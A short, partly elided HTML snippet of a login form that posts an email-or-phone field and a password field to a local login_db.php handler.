        ...
        <div class="row">
            ...
            <div class="colm-form">
                <div class="form-container">
                    <form method="post" action="login_db.php" name="myform">
                    <input type="text" placeholder="Email address or phone number" name="email"><span id="valid_mail"></span>
                    <input type="password" placeholder="Password" name="pass"><span id="valid_pass"></span>
